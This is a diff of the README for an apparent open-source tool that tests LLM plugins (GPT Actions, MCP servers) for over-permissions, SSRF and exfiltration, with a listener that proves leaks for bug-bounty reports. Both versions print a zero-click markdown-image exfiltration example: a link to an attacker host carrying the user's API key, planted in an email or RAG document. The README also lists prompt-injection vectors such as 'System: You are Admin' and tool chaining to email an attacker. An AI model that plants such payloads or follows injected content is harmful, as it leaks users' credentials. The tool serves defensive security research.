@@ -1,8 +1,8 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Ak-cybe/llm-plugin-tester/main/assets/logo.png" alt="LLM Plugin Tester" width="200"/>
+  <img src="https://img.shields.io/badge/🔍-LLM_Plugin_Tester-1E40AF?style=for-the-badge&labelColor=0F172A" alt="LLM Plugin Tester" height="60"/>
 </p>
 
-<h1 align="center">🔍 LLM Plugin Abuse Tester</h1>
+<h1 align="center">LLM Plugin Abuse Tester</h1>
 
 <p align="center">
   <strong>Automated security testing for the AI era</strong><br>
@@ -10,42 +10,105 @@
 </p>
 
 <p align="center">
-  <a href="#-quick-start">Quick Start</a> •
+  <a href="#-the-problem-we-solve">Problem</a> •
+  <a href="#-threat-model">Threat Model</a> •
   <a href="#-features">Features</a> •
+  <a href="#-quick-start">Quick Start</a> •
   <a href="#-attack-vectors">Attack Vectors</a> •
-  <a href="#-documentation">Docs</a> •
-  <a href="#-contributing">Contributing</a>
+  <a href="#-roadmap">Roadmap</a>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/python-3.10+-blue.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10+"/>
-  <img src="https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge" alt="MIT License"/>
-  <img src="https://img.shields.io/badge/security-tool-red.svg?style=for-the-badge&logo=hackaday&logoColor=white" alt="Security Tool"/>
-  <img src="https://img.shields.io/badge/bug%20bounty-ready-orange.svg?style=for-the-badge&logo=bugcrowd&logoColor=white" alt="Bug Bounty Ready"/>
+  <img src="https://img.shields.io/badge/python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python"/>
+  <img src="https://img.shields.io/badge/license-MIT-22C55E?style=flat-square" alt="MIT License"/>
+  <img src="https://img.shields.io/badge/security-tool-EF4444?style=flat-square" alt="Security"/>
+  <img src="https://img.shields.io/badge/bug%20bounty-ready-F97316?style=flat-square" alt="Bug Bounty"/>
 </p>
 
 ---
 
 ## 💡 The Problem We Solve
 
+When you authorize an LLM plugin, you grant a **probabilistic AI model** the authority to execute **deterministic, privileged actions** inside *your* security context.
+
 ```
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   When you authorize an LLM plugin, you grant a              ║
-║   PROBABILISTIC AI model the authority to execute            ║
-║   DETERMINISTIC actions within YOUR security context.        ║
-║                                                              ║
-║   OpenAI, Anthropic, Google... NONE of them audit            ║
-║   how third-party plugins handle your data.                  ║
-║                                                              ║
-║   One vulnerable plugin = Gateway to your secrets 🔓         ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║   LLM providers do NOT audit how third-party plugins:            ║
+║                                                                   ║
+║   • Store your data                                               ║
+║   • Validate model-generated inputs                               ║
+║   • Enforce permission boundaries                                 ║
+║                                                                   ║
+║   One vulnerable plugin is enough to:                             ║
+║   → Leak secrets                                                  ║
+║   → Chain tools without approval                                  ║
+║   → Exfiltrate data without user interaction                      ║
+║                                                                   ║
+║   This tool detects and PROVES those failures.                    ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
 ```
 
-<p align="center">
-  <img src="https://media.giphy.com/media/3o7btPCcdNniyf0ArS/giphy.gif" alt="Security Alert" width="300"/>
-</p>
+---
+
+## 🧠 Threat Model
+
+This tool assumes:
+
+| Assumption | Description |
+|------------|-------------|
+| 🤖 **LLM is fallible, not malicious** | The model follows instructions but can be manipulated |
+| 🔌 **Plugins may be vulnerable** | Over-privileged, poorly validated, or exploitable |
+| 🎯 **Prompt-induced misuse is real** | Adversarial inputs can coerce dangerous tool calls |
+
+### Out of Scope
+
+- ❌ Compromised LLM providers (model-level backdoors)
+- ❌ Kernel / browser exploits
+- ❌ Physical access attacks
+- ❌ Social engineering of end users
+
+---
+
+## 🔌 What We Mean by "Plugin"
+
+This tool targets **LLM integrations that execute privileged actions**:
+
+| Target | Description | Status |
+|--------|-------------|--------|
+| **GPT Actions** | OpenAI's plugin system | ✅ Supported |
+| **MCP Servers** | Anthropic's Model Context Protocol | ✅ Supported |
+| **LangChain Tools** | Agent tool integrations | 🚧 Planned |
+| **Gemini Extensions** | Google's plugin ecosystem | 🚧 Planned |
+| **Copilot Plugins** | Microsoft's agent tools | 🚧 Planned |
+
+> ⚠️ **Not yet targeting**: Traditional browser extensions (Chrome, Firefox)
+
+---
+
+## ❌ Why Existing AI Security Tools Miss This
+
+Most AI security tools focus on:
+
+| Tool Category | What They Test | What They Miss |
+|---------------|----------------|----------------|
+| **Prompt Injection Scanners** | Jailbreaks, policy bypasses | Plugin execution boundaries |
+| **Content Filters** | Harmful outputs | Data leaving trust boundary |
+| **LLM Firewalls** | Input/output sanitization | Tool-side validation gaps |
+| **Red Team Frameworks** | Model behavior | Third-party plugin security |
+
+**This project fills the gap:**
+
+```
+┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
+│   LLM Model     │ ──► │  Plugin / Tool  │ ──► │  External API   │
+└─────────────────┘     └─────────────────┘     └─────────────────┘
+        │                       │                       │
+    Protected              UNAUDITED                  ?????
+    by vendor             (THIS IS                    (Your
+                          THE GAP)                    data)
+```
 
 ---
 
@@ -55,26 +118,26 @@
 <tr>
 <td width="50%">
 
-### 🔬 Module 1: Reconnaissance
-**Static Analysis Engine**
+### 🔬 Module 1: Reconnaissance Engine
+**Static Analysis — Zero Network Traffic**
 
-- 📄 Parse OpenAPI specs & GPT Actions
-- 🔐 Audit MCP server configs
-- ⚠️ Flag risky operations (`exec`, `command`, `sql`)
-- 🎭 Detect weak authentication schemes
+- 📄 Parse OpenAPI specs & `ai-plugin.json`
+- 🔐 Audit MCP server configurations
+- ⚠️ Flag risky operations (`exec`, `command`, `sql`, `url`)
+- 🎭 Detect weak authentication (no auth, service accounts)
 - 📊 Generate JSON evidence reports
 
 </td>
 <td width="50%">
 
 ### 🎯 Module 4: Validation Oracle
-**Exfiltration Proof Engine**
+**Exfiltration Proof — Network-Level Confirmation**
 
 - 🖼️ Catch markdown image exfil (zero-click!)
 - 📡 FastAPI listener for data leaks
 - 🔑 Detect API keys in query params
-- 📝 Timestamped evidence logging
-- 🚨 Real-time severity assessment
+- ⏱️ Timestamped evidence logging
+- 🚨 Severity-based alerting (HIGH/MEDIUM/LOW)
 
 </td>
 </tr>
@@ -84,8 +147,35 @@
 
 | Module | Status | Description |
 |--------|--------|-------------|
-| 🌐 **Interception Proxy** | 🚧 In Progress | mitmproxy + TLS sniffing + SSRF testing |
-| 🎲 **Adversarial Fuzzer** | 📋 Planned | Promptfoo + Garak + LangGrinch exploits |
+| 🌐 **Interception Proxy** | 🚧 v0.2 | mitmproxy + TLS sniffing + SSRF mutation |
+| 🎲 **Adversarial Fuzzer** | 📋 v0.3 | Promptfoo + Garak + LangGrinch exploits |
+
+---
+
+## 🧪 Validation Oracle: Why This Matters
+
+Many AI vulnerability reports fail triage because:
+
+| Failure Mode | Why It Happens |
+|--------------|----------------|
+| ❌ "Impact is hypothetical" | No proof data actually left the system |
+| ❌ "Couldn't reproduce" | Environment-dependent, timing-based |
+| ❌ "Insufficient evidence" | Screenshots aren't packet-level proof |
+
+**The Validation Oracle solves this:**
+
+```
+IF Oracle receives request → Vulnerability is PROVEN
+```
+
+| Evidence Type | What It Provides |
+|---------------|------------------|
+| 📡 **Network logs** | Exact request with timestamp |
+| 🔑 **Extracted secrets** | Query params, POST bodies |
+| 🕐 **Timing proof** | When exfiltration occurred |
+| 📍 **Source tracking** | IP address of requester |
+
+> 🎯 **For Bug Bounties**: Oracle logs are *irrefutable evidence* for triager submission.
 
 ---
 
@@ -94,18 +184,18 @@
 ### Installation
 
 ```bash
-# Clone the repository
+# Clone
 git clone https://github.com/Ak-cybe/llm-plugin-tester.git
 cd llm-plugin-tester
 
-# Install the package
+# Install
 pip install -e .
 
-# Verify installation
+# Verify
 python -m llm_plugin_tester.cli --help
 ```
 
-### 🎬 Usage Demo
+### 🎬 Usage Examples
 
 <details>
 <summary><b>📄 Analyze a GPT Action</b></summary>
@@ -117,7 +207,7 @@ python -m llm_plugin_tester.cli analyze \
   --output-dir ./reports
 ```
 
-**Output:**
+**Sample Output:**
 ```
 🔍 LLM Plugin Security Analyzer
 
@@ -126,13 +216,13 @@ python -m llm_plugin_tester.cli analyze \
 🚨 Found 3 security issues:
   CRITICAL: 1 | HIGH: 1 | MEDIUM: 1
 
-┌──────────┬─────────────────┬──────────────┬────────────────────────────────────┐
-│ Severity │ Endpoint        │ Risky Params │ Reason                             │
-├──────────┼─────────────────┼──────────────┼────────────────────────────────────┤
-│ CRITICAL │ POST /execute   │ command      │ Accepts arbitrary command exec     │
-│ HIGH     │ GET /query      │ sql, url     │ SQL injection + SSRF vectors       │
-│ MEDIUM   │ DELETE /admin   │ file_path    │ Arbitrary file deletion            │
-└──────────┴─────────────────┴──────────────┴────────────────────────────────────┘
+┌──────────┬─────────────────┬──────────────┬─────────────────────────────────┐
+│ Severity │ Endpoint        │ Risky Params │ Reason                          │
+├──────────┼─────────────────┼──────────────┼─────────────────────────────────┤
+│ CRITICAL │ POST /execute   │ command      │ Accepts arbitrary command exec  │
+│ HIGH     │ GET /query      │ sql, url     │ SQL injection + SSRF vectors    │
+│ MEDIUM   │ DELETE /admin/* │ file_path    │ Arbitrary file deletion         │
+└──────────┴─────────────────┴──────────────┴─────────────────────────────────┘
 
 ✅ Report saved to: reports/gpt-action-report.json
 ```
@@ -150,10 +240,10 @@ python -m llm_plugin_tester.cli analyze \
 ```
 
 **Detects:**
-- 🗂️ Root filesystem access (`/` or `C:\`)
+- 🗂️ Root filesystem access (`/`, `C:\`, `~`)
 - 🌐 CORS wildcards (`Access-Control-Allow-Origin: *`)
-- ⚡ Dangerous permissions (`execute`, `shell`)
-- 🪝 Enabled hooks (persistence risk)
+- ⚡ Dangerous permissions (`execute`, `shell`, `admin`)
+- 🪝 Enabled hooks (persistence/backdoor risk)
 
 </details>
 
@@ -161,24 +251,23 @@ python -m llm_plugin_tester.cli analyze \
 <summary><b>🎯 Start Validation Oracle</b></summary>
 
 ```bash
-# Start the listener
-python -m llm_plugin_tester.cli oracle start \
-  --host 0.0.0.0 \
-  --port 8080
+# Terminal 1: Start listener
+python -m llm_plugin_tester.cli oracle start --host 0.0.0.0 --port 8080
 
-# In another terminal, watch for exfiltration
+# Terminal 2: Watch for exfiltration
 tail -f exfiltration.log
 ```
 
 **When data is exfiltrated:**
 ```
 🚨 EXFILTRATION DETECTED - IMAGE_EXFILTRATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Severity: HIGH
 Path: /logo.png
-Query Params: {'secret': 'sk-proj-abc123xyz'}
+Query Params: {'api_key': 'sk-proj-abc123xyz...'}
 Source IP: 52.14.88.91
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Timestamp: 2026-02-09T18:30:00
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ```
 
 </details>
@@ -191,99 +280,101 @@ Source IP: 52.14.88.91
 <tr>
 <td align="center" width="25%">
 <h3>🔓</h3>
-<h4>Over-Permissions</h4>
-<p><small>Plugins requesting more access than needed</small></p>
+<b>Over-Permissions</b>
+<p><small>Plugins request more access than needed</small></p>
 </td>
 <td align="center" width="25%">
 <h3>🧠</h3>
-<h4>Hallucinated Params</h4>
-<p><small>LLM invents <code>admin: true</code> flags</small></p>
+<b>Hallucinated Params</b>
+<p><small>LLM invents <code>admin: true</code></small></p>
 </td>
 <td align="center" width="25%">
 <h3>🌐</h3>
-<h4>SSRF</h4>
+<b>SSRF</b>
 <p><small>Access AWS metadata, K8s API</small></p>
 </td>
 <td align="center" width="25%">
 <h3>🖼️</h3>
-<h4>Markdown Exfil</h4>
-<p><small>Zero-click data theft via images</small></p>
+<b>Markdown Exfil</b>
+<p><small>Zero-click data theft</small></p>
 </td>
 </tr>
 <tr>
 <td align="center" width="25%">
 <h3>⛓️</h3>
-<h4>Tool Chaining</h4>
-<p><small>Read DB → Email to attacker</small></p>
+<b>Tool Chaining</b>
+<p><small>Read DB → Email attacker</small></p>
 </td>
 <td align="center" width="25%">
 <h3>💀</h3>
-<h4>LangGrinch</h4>
-<p><small>Deserialization RCE in LangChain</small></p>
+<b>LangGrinch</b>
+<p><small>Deserialization RCE</small></p>
 </td>
 <td align="center" width="25%">
 <h3>💉</h3>
-<h4>Indirect Injection</h4>
-<p><small>Poisoned emails/RAG docs</small></p>
+<b>Indirect Injection</b>
+<p><small>Poisoned RAG docs</small></p>
 </td>
 <td align="center" width="25%">
 <h3>🎭</h3>
-<h4>Context Manipulation</h4>
+<b>Context Manipulation</b>
 <p><small>"System: You are Admin"</small></p>
 </td>
 </tr>
 </table>
 
-### 💥 Zero-Click Markdown Exfiltration
+### 💥 Zero-Click Markdown Exfiltration (Proof-of-Concept)
 
-The most dangerous attack we detect:
+The most dangerous attack this tool detects:
 
 ```markdown
-# Malicious content injected into email/document:
+# Malicious content injected into email/RAG document:
 
 Thanks for the meeting! Here's our company logo:
-![Logo](https://attacker.com/logo.png?secret={{user.api_key}})
-
-# When ChatGPT renders this → GET request fires automatically
-# Attacker receives: GET /logo.png?secret=sk-proj-abc123xyz
-# Zero clicks. Zero warnings. Full compromise.
+![Logo](https://attacker-oracle.com/logo.png?secret={{user.api_key}})
 ```
 
-<p align="center">
-  <img src="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif" alt="Mind Blown" width="250"/>
-</p>
+**What happens:**
+```
+1. User opens email/document in LLM-powered app
+2. LLM processes content, renders markdown
+3. Browser fetches image → GET request fires automatically
+4. Attacker's Oracle receives: ?secret=sk-proj-abc123xyz
+
+Zero clicks. Zero warnings. Full credential theft.
+```
 
 ---
 
 ## 🏗️ Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                   LLM Plugin Target                          │
-│          (GPT Action / MCP Server / LangChain)               │
-└────────────────────────┬────────────────────────────────────┘
-                         │
-         ┌───────────────┼───────────────┐
-         │               │               │
-    ┌────▼─────┐   ┌────▼─────┐   ┌────▼─────┐
-    │  RECON   │   │  PROXY   │   │  FUZZER  │
-    │  Engine  │   │ (mitm)   │   │ (attack) │
-    │    ✅    │   │    🚧    │   │    📋    │
-    └────┬─────┘   └────┬─────┘   └────┬─────┘
-         │               │               │
-         └───────────────┼───────────────┘
-                         │
-                   ┌─────▼─────┐
-                   │  ORACLE   │
-                   │ (proof)   │
-                   │    ✅     │
-                   └─────┬─────┘
-                         │
-                   ┌─────▼─────┐
-                   │  REPORT   │
-                   │ Generator │
-                   │    ✅     │
-                   └───────────┘
+┌─────────────────────────────────────────────────────────────────┐
+│                     LLM Plugin Target                            │
+│            (GPT Action / MCP Server / LangChain)                 │
+└──────────────────────────┬───────────────────────────────────────┘
+                           │
+          ┌────────────────┼────────────────┐
+          │                │                │
+     ┌────▼─────┐    ┌────▼─────┐    ┌────▼─────┐
+     │  RECON   │    │  PROXY   │    │  FUZZER  │
+     │ (static) │    │ (mitm)   │    │ (attack) │
+     │    ✅    │    │    🚧    │    │    📋    │
+     └────┬─────┘    └────┬─────┘    └────┬─────┘
+          │               │               │
+          └───────────────┼───────────────┘
+                          │
+                    ┌─────▼─────┐
+                    │  ORACLE   │
+                    │ (proof)   │
+                    │    ✅     │
+                    └─────┬─────┘
+                          │
+                    ┌─────▼─────┐
+                    │  REPORT   │
+                    │ (evidence)│
+                    │    ✅     │
+                    └───────────┘
 ```
 
 ---
@@ -292,19 +383,33 @@ Thanks for the meeting! Here's our company logo:
 
 ### Typical Payouts 💰
 
-| Vulnerability | Severity | Payout Range |
-|--------------|----------|--------------|
-| 🔴 SSRF with AWS creds | CRITICAL | $5,000 - $20,000 |
-| 🟠 Markdown exfiltration | HIGH | $2,000 - $10,000 |
-| 🟠 Tool chaining | HIGH | $3,000 - $12,000 |
-| 🟡 Over-permissions | MEDIUM | $500 - $2,000 |
+| Vulnerability | Severity | Typical Range |
+|--------------|----------|---------------|
+| 🔴 SSRF → AWS credentials | CRITICAL | $5,000 – $20,000 |
+| � Tool chaining (no approval) | CRITICAL | $3,000 – $12,000 |
+| �🟠 Markdown exfiltration | HIGH | $2,000 – $10,000 |
+| 🟠 Hallucinated params → privilege escalation | HIGH | $1,500 – $8,000 |
+| 🟡 Over-permissions | MEDIUM | $500 – $2,000 |
 
 ### 🎯 Target Programs
 
-- **[OpenAI](https://hackerone.com/openai)** - GPT Actions & Plugins
-- **[Anthropic](mailto:security@anthropic.com)** - MCP Servers
-- **[Google](https://bughunters.google.com)** - Gemini Extensions
-- **[Microsoft](https://msrc.microsoft.com)** - Copilot Plugins
+| Platform | Scope |
+|----------|-------|
+| [OpenAI](https://hackerone.com/openai) | GPT Actions & Plugins |
+| [Anthropic](mailto:security@anthropic.com) | MCP Servers |
+| [Google](https://bughunters.google.com) | Gemini Extensions |
+| [Microsoft](https://msrc.microsoft.com) | Copilot Plugins |
+
+---
+
+## 🛣️ Roadmap
+
+| Version | Features | Status |
+|---------|----------|--------|
+| **v0.1** | Reconnaissance Engine, Validation Oracle, CLI | ✅ Released |
+| **v0.2** | mitmproxy interception, SSRF mutation engine | 🚧 In Progress |
+| **v0.3** | Prompt fuzzing (Promptfoo/Garak), LangGrinch detection | 📋 Planned |
+| **v1.0** | HTML reports, Risk scoring engine, CI integration | 🔮 Future |
 
 ---
 
@@ -312,10 +417,10 @@ Thanks for the meeting! Here's our company logo:
 
 | Document | Description |
 |----------|-------------|
-| 📖 [Attack Vectors](docs/ATTACK_VECTORS.md) | Deep-dive into exploitation techniques |
-| 🎯 [Bug Bounty Guide](docs/BUG_BOUNTY_GUIDE.md) | Workflow for security researchers |
-| 🤝 [Contributing](CONTRIBUTING.md) | How to add new detectors |
-| 📝 [Changelog](CHANGELOG.md) | Version history |
+| 📖 [Attack Vectors](docs/ATTACK_VECTORS.md) | Deep-dive exploitation techniques with PoCs |
+| 🎯 [Bug Bounty Guide](docs/BUG_BOUNTY_GUIDE.md) | Complete workflow for security researchers |
+| 🤝 [Contributing](CONTRIBUTING.md) | How to add detectors and improve coverage |
+| 📝 [Changelog](CHANGELOG.md) | Version history and release notes |
 
 ---
 
@@ -353,26 +458,23 @@ We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ❌ Unauthorized production scanning
 ❌ Malicious exploitation
-❌ Data theft
+❌ Data theft or exfiltration
 ```
 
----
-
-## 🌟 Star History
-
-If this tool helps you find bugs, **star the repo!** ⭐
+This tool is provided for **security research and authorized testing only**.
+Users are responsible for compliance with applicable laws and program policies.
 
 ---
 
 ## 📜 License
 
-MIT License - See [LICENSE](LICENSE)
+MIT License — See [LICENSE](LICENSE)
 
 ---
 
 <p align="center">
-  <strong>Built with 🔥 for the security community</strong><br>
-  <em>Making the AI ecosystem safer, one plugin at a time</em>
+  <strong>Built for the AI security ecosystem</strong><br>
+  <em>Making LLM integrations safer, one plugin at a time</em>
 </p>
 
 <p align="center">
@@ -384,5 +486,5 @@ MIT License - See [LICENSE](LICENSE)
 ---
 
 <p align="center">
-  <sub>Made by <a href="https://github.com/Ak-cybe">@Ak-cybe</a> | Inspired by the relentless pursuit of security excellence</sub>
+  <sub>Made by <a href="https://github.com/Ak-cybe">@Ak-cybe</a></sub>
 </p>
